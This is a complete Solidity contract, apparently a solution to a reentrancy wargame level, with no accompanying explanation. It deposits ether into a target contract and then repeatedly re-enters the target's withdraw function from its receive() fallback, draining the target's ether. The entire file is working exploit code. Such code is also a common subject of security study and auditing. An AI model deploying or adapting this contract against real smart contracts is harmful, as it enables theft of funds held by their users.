pragma solidity ^0.6.12;

interface Reentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
    function balanceOf(address) external view returns (uint256);
}


contract ReentrancyAttacker {
    Reentrance immutable private victim;

    constructor(address _victim) public {
        victim = Reentrance(_victim);
    }

    function attack() external payable {
        victim.donate{value: msg.value}(address(this));
        uint256 bal = victim.balanceOf(address(this));
        victim.withdraw(bal);
    }

    receive() external payable {
        if (victim.balanceOf(address(this)) > 0) {
            victim.withdraw(victim.balanceOf(address(this)));
        }
    }
}